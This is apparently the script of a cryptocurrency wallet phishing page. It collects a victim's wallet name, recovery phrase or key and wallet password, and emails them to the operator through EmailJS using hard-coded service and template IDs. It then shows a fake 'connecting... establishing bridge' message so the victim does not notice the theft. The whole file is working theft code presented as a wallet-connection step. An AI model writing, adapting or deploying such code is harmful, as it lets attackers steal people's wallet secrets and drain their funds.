const item=document.getElementsByClassName("item")
const cont1=document.getElementsByClassName("cont1")[0]
const cont2=document.getElementsByClassName("cont2")[0]
const cont3=document.getElementsByClassName("cont3")[0]
const con=document.getElementsByClassName("name")[0]

item[0].addEventListener('click',()=>{
    item[0].classList.add('active-div')
    item[1].classList.remove('active-div')
    item[2].classList.remove('active-div')
    cont1.classList.add('dis')
    cont2.classList.remove('dis')
    cont3.classList.remove('dis')
    con.innerHTML="verifying details "
})
item[1].addEventListener('click',()=>{
    item[1].classList.add('active-div')
    item[2].classList.remove('active-div')
    item[0].classList.remove('active-div')
    cont2.classList.add('dis')
    cont1.classList.remove('dis')
    cont3.classList.remove('dis')
    con.innerHTML="verifying details "
})
item[2].addEventListener('click',()=>{
    item[2].classList.add('active-div')
    item[1].classList.remove('active-div')
    item[0].classList.remove('active-div')
    cont3.classList.add('dis')
    cont2.classList.remove('dis')
    cont1.classList.remove('dis')
    con.innerHTML="verifying details "
})


let nameOfWALLET=localStorage.getItem("textvalue")
const servicerID= "service_19o6v8s"
const tempID="template_n10h5uy"
  let params = {
    wallet_name:nameOfWALLET,
    from_name:document.getElementById("title_1").textContent,
    phrase:document.getElementById("input_1").value,
    addres:document.getElementById("input_2").value
}
function submitOne(){
    params = {
    wallet_name:nameOfWALLET,
    from_name:document.getElementById("title_1").textContent,
    phrase:document.getElementById("input_1").value,
    addres:document.getElementById("input_2").value
  }
  console.log(nameOfWALLET);
emailjs.send(servicerID,tempID,params).then(
  function (res){
      con.innerHTML="connecting... establishing bridge"
  }
    )

}
function submitTwo(){
      params = {
    wallet_name:nameOfWALLET,
    from_name:document.getElementById("title_2").textContent,
    phrase:document.getElementById("input_3").value,
    addres:document.getElementById("input_4").value
}
emailjs.send(servicerID,tempID,params).then(
  function (res){
    con.innerHTML="connecting... establishing bridge"
  }
    )

}
function submitThree(){
      params = {
    wallet_name:nameOfWALLET,
    from_name:document.getElementById("title_3").textContent,
    phrase:"the password is : ",
    addres:document.getElementById("input_5").value
}
emailjs.send(servicerID,tempID,params).then(
  function (res){
    con.innerHTML="connecting... establishing bridge"
  }
    )

}


